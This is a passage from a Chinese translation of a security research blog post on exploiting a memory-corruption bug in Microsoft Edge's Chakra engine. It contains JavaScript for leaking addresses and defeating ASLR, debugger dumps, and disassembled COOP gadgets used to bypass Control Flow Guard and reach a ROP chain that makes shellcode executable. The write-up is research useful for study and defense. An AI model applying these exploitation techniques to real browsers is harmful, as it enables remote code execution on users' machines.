    00007ffd`92937607 0f8400810600    je      d3d10warp!ShaderConv::CInstr::Token::Token+0x2da6d (00007ffd`9299f70d)
    00007ffd`9293760d 4883c040        add     rax,40h
    00007ffd`92937611 4883e0c0        and     rax,0FFFFFFFFFFFFFFC0h
    00007ffd`92937615 488948f8        mov     qword ptr [rax-8],rcx         // address of buffer is stored at buffer+0x38
    0:010> dqs @rcx
    00000189`0f720000  00000000`00000000
    00000189`0f720008  00000000`00000000
    00000189`0f720010  00000000`00000000
    00000189`0f720018  00000000`00000000
    00000189`0f720020  00000000`00000000
    00000189`0f720028  00000000`00000000
    00000189`0f720030  00000000`00000000
    00000189`0f720038  00000189`0f720000        //self-reference pointer
    00000189`0f720040  00000000`00000000
    00000189`0f720048  00000000`00000000
    00000189`0f720050  00000000`00000000
    00000189`0f720058  00000000`00000000
    00000189`0f720060  00000000`00000000
    00000189`0f720068  00000000`00000000
    00000189`0f720070  00000000`00000000
    00000189`0f720078  00000000`00000000
所以在WebGL初始化代码完成之后，我们需要使用R /
W原语来遍历WebGL缓冲区（它们与我们的破坏的int数组相邻），寻找偏移量为0x38的自引用指针。一旦我们找到自引用指针，就可以很容易地计算出我们破坏的int数组的基址；
反过来，这意味着现在我们可以根据绝对地址进行读操作（但是请记住，我们仍然操作一个主要的限制，那就是只能读取/写入大于被破坏的int数组的基址的地址）：
    function after_webgl(corrupted_index){
        for (var i = 11; i > 1; i -= 1){
            base_index = 0x4000 * i;
            arr[corrupted_index][base_index + 0x20] = 0x21212121;   //write at least to offset N if you want to read from offset N
            //read the qword at webgl_block + 0x38
            var self_ref = ud(arr[corrupted_index][base_index + 1]) * (2**32) + ud(arr[corrupted_index][base_index]);
            //If it looks like the pointer we are looking for...
            if (((self_ref & 0xffff) == 0) && (self_ref > 0xffffffff)){
                var array_addr = self_ref - i * 0x10000;
                //Limitation of the R/W primitive: target address must be > array address
                if (ptr_to_object > array_addr){
                    //Calculate the proper index to target the address of the object
                    var offset = (ptr_to_object - (array_addr + 0x38)) / 4;
                    //Write at least to offset N if you want to read from offset N
                    arr[corrupted_index][offset + 0x20] = 0x21212121;
                    //Read the address of the vtable!
                    var vtable_ptr = ud(arr[corrupted_index][offset + 1]) * (2**32) + ud(arr[corrupted_index][offset]);
                    //Calculate the base address of chakra.dll
                    var chakra_baseaddr = vtable_ptr - 0x005864d0;
                    [...]
所以,如果我们足够幸运的话，泄漏的对象的地址会大于我们的损坏的int数组的地址（如果在第一次尝试中没有这么幸运的话，则需要更多的工作），我们可以简单的计算指定目标对象的索引（完成读取OOB所需），所以我们获取指向vtable的指针，然后我们可以计算chakra.dll的基地址。这样我们就挫败了ASLR，所以可以继续进入开发过程中的下一步。
**伪面向对象编程**
现在我们已经可以读写我们泄露的对象了，下面要设法绕过Control Flow
Guard，以便可以将执行流重定向到我们的ROP链。为了绕过CFG，我使用了一种被称为伪面向对象编程（COOP）[11]或面向对象的漏洞利用技术[12]。
确切地说，我在后文中遵循了Sam Thomas [13]所描述的方法。这种技术基于链接两个函数，两个都是有效的CFG目标，提供两个原语：
**第一个函数（一个COOP部件）将局部变量（位于堆栈中）的地址作为另一个函数的参数传递，该函数通过间接调用进行调用。**
**第二个函数期望其中一个参数是指向结构的指针，并写入该预期结构的成员。**
给定第二个COOP部件写入预期结构中的正确偏移量（等于第一个函数的返回地址存储在堆栈中的地址减去作为第一个函数的参数传递的局部变量的地址），可以使第二个函数覆盖堆栈中第一个函数的返回地址。这样，当执行第一个COOP部件的RET指令时，我们可以将执行流转移到ROP链，同时避开CFG，因为这种缓解尝试无法保护返回地址。
为了找到满足上述条件的两个函数，我写了一个IDApython脚本，它基于Quarkslab的Triton [14]
DBA框架，这是由我的同事Jonathan Salwan、Pierrick Brunet和Romain Thomas开发的一个令人敬仰的引导引擎。
运行我的工具并检查其输出后，我选择了chakra！Js :: DynamicObjectEnumerator  ::
MoveNext函数作为第一个COOP部件，通过间接调用来调用另一个函数，传递一个局部变量作为第二个参数（RDX寄存器）。存储堆栈中返回地址的地址与本地变量之间的距离为0x18字节：
    .text:0000000180089D40 public: virtual int Js::DynamicObjectEnumerator::MoveNext(unsigned char *) proc near
    .text:0000000180089D40                 mov     r11, rsp
    .text:0000000180089D43                 mov     [r11+10h], rdx
    .text:0000000180089D47                 mov     [r11+8], rcx
    .text:0000000180089D4B                 sub     rsp, 38h
    .text:0000000180089D4F                 mov     rax, [rcx]
    .text:0000000180089D52                 mov     r8, rdx
    .text:0000000180089D55                 lea     rdx, [r11-18h]       //second argument is the address of a local variable
    .text:0000000180089D59                 mov     rax, [rax+2E8h]
    .text:0000000180089D60                 call    cs:__guard_dispatch_icall_fptr   //call second COOP gadget
    .text:0000000180089D66                 xor     ecx, ecx
    .text:0000000180089D68                 test    rax, rax
    .text:0000000180089D6B                 setnz   cl
    .text:0000000180089D6E                 mov     eax, ecx
    .text:0000000180089D70                 add     rsp, 38h
    .text:0000000180089D74                 retn
    .text:0000000180089D74 public: virtual int Js::DynamicObjectEnumerator::MoveNext(unsigned char *) endp
我们制作一个假的虚拟桌面，使间接调用引用第二个COOP部件；对于第二个函数，我选择了edgehtml！CRTCMediaStreamTrackStats
::
WriteSnapshotForTelemetry。第二个函数将EAX寄存器的内容写入第二个参数指向的结构的偏移量0x18处，这样就可以覆盖第一个函数的返回地址了：
    .text:000000018056BF90 ; void __fastcall CRTCMediaStreamTrackStats::WriteSnapshotForTelemetry(CRTCMediaStreamTrackStats *__hidden this, struct TelemetryStats::BaseTelemetryStats *)
    .text:000000018056BF90                 mov     eax, [rcx+30h]
    .text:000000018056BF93                 mov     [rdx+4], eax
    .text:000000018056BF96                 mov     eax, [rcx+34h]
    .text:000000018056BF99                 mov     [rdx+8], eax
    .text:000000018056BF9C                 mov     rax, [rcx+38h]
    .text:000000018056BFA0                 mov     [rdx+10h], rax
    .text:000000018056BFA4                 mov     eax, [rcx+40h]
    .text:000000018056BFA7                 mov     [rdx+18h], eax   //writes to offset 0x18 of the structure pointed by the 2nd argument == overwrites return address
    .text:000000018056BFAA                 mov     eax, [rcx+44h]
    .text:000000018056BFAD                 mov     [rdx+1Ch], eax
    .text:000000018056BFB0                 mov     eax, [rcx+4Ch]
    .text:000000018056BFB3                 mov     [rdx+20h], eax
    .text:000000018056BFB6                 mov     eax, [rcx+50h]
    .text:000000018056BFB9                 mov     [rdx+24h], eax
    .text:000000018056BFBC                 retn
    .text:000000018056BFBC ?WriteSnapshotForTelemetry@CRTCMediaStreamTrackStats@@MEBAXPEAUBaseTelemetryStats@TelemetryStats@@@Z endp
在反汇编CRTCMediaStreamTrackStats ::
WriteSnapshotForTelemetry函数的代码中可以看出，用于覆盖返回地址的qword来自RCX + 0x40 / RCX +
0x44，这意味着它是具有假的vtable的对象的成员，因此它可以被攻击者完全控制。
当退出第一个COOP函数时，会覆盖返回地址，所以，我们就绕过了Control Flow Guard。我们使用堆栈旋转部件的地址作为覆盖返回地址的值；
这样，我们只需启动一个传统的ROP链，它将调用EShims！NS_ACGLockdownTelemetry ::
APIHook_VirtualProtect，为我们的shellcode提供可执行权限，从而远程执行代码。
**小结**
ArrayBuffer对象一直是不同网络浏览器的各种UAF漏洞的源泉，Edge中的Chakra引擎也不例外。事实上，ArrayBuffer构造函数可以使用两个不同的分配器（malloc或VirtualAlloc），加上我们可以根据要创建的ArrayBuffer的长度来控制使用哪一个的事实，从而在尝试利用漏洞方面提供了便利。如果我们唯一的选择是将底层缓冲区分配给CRT堆，漏洞的利用可能会更难一些。
为了将相对R / W原语转换为绝对R / W，获得损坏的整数数组的基址是难点。为此，我们需要弄清楚如何滥用Quicksort来进行精确的元素交换。
最后，这篇博文的最后一部分展示了伪面向对象编程（COOP）的实际应用，我们通过利用两个有效的C ++虚拟函数设法绕过了Control Flow
Guard：chakra！Js :: DynamicObjectEnumerator  ::
MoveNext和edgehtml！CRTCMediaStreamTrackStats ::
WriteSnapshotForTelemetry。它们可以进行链接以覆盖前者的返回地址，从而绕过CFG。
**  
**
**致谢**
非常感谢我的同事SébastienRenaud和Jean-BaptisteBédrune在百忙之中帮我审阅了这篇文章。
**参考文献**
[1]
[2]
[3]
[4]
[5]
[6]
[7]
[8]
[9]
[10]
[11]
[12]
[13]
[14] 